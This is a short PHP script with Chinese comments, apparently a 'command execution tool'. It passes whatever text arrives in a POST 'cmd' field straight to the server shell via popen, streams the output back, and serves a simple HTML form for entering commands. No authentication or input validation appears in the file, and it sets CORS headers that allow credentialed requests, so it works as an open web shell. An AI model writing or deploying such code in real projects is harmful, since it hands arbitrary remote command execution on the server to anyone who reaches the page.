<?php
include 'init.php';
header('Access-Control-Allow-Origin: ' . Allow_Origin);
header('Access-Control-Allow-Credentials: ' . 'true');
header('Access-Control-Allow-Headers: ' . 'Content-Type');
header('Content-Type: ' . 'application/json;charset=utf-8');
/**
 * 实时执行POST传入的命令并输出结果
 * 基础原理：
 * 1. 使用 $_POST 接收参数。
 * 2. 关闭 PHP 输出缓冲，确保数据即时发送到浏览器。
 * 3. 使用 popen 打开进程管道，逐行读取输出。
 */
// 1. 检查是否为 POST 请求且包含命令参数
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
	// 获取传入的命令
	$command = $_POST['cmd'];
	// 2. 关闭输出缓冲
	// 如果 zlib 压缩开启，可能需要关闭，但以下代码处理了 PHP 自身的缓冲
	while (ob_get_level() > 0) {
		ob_end_flush();
	}
	// 开启隐式刷新，每次输出后立即刷新缓冲区
	ob_implicit_flush(true);
	// 设置浏览器不缓存内容，并指定文本流类型
	header('Content-Type: text/plain; charset=utf-8');
	header('X-Accel-Buffering: no'); // 针对 Nginx 服务器的关键配置，关闭代理缓冲
	echo "正在执行命令: {$command}\n";
	echo str_repeat('-', 50) . "\n";
	// 3. 调用命令行执行
	// popen 打开一个指向进程的管道，'r' 模式表示读取进程的标准输出
	// 参考资料 [8] 提示了标准输入输出流的概念
	$handle = popen($command, 'r');
	if (is_resource($handle)) {
		// 4. 实时读取并输出结果
		// 逐行读取，防止内存溢出，同时实现实时性
		while (!feof($handle)) {
			$buffer = fgets($handle);
			if ($buffer !== false) {
				echo $buffer;
				// 刷新 PHP 和 Web 服务器的缓冲区，强制发送给客户端
				flush();
			}
		}
		// 关闭管道
		$return_code = pclose($handle);
		echo "\n" . str_repeat('-', 50) . "\n";
		echo "执行完毕。返回状态码: {$return_code}\n";
	} else {
		echo "错误：无法启动命令进程。\n";
	}
} else {
	// 非 POST 请求时显示简单的提交表单
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>PHP 命令行执行工具</title>
</head>
<body>
	<h2>命令执行接口</h2>
	<form method="post" action="">
		<label for="cmd">输入命令：</label><br>
		<input type="text" name="cmd" id="cmd" size="50" placeholder="例如: ping 127.0.0.1">
		<button type="submit">执行</button>
	</form>
</body>
</html>
<?php
}
?>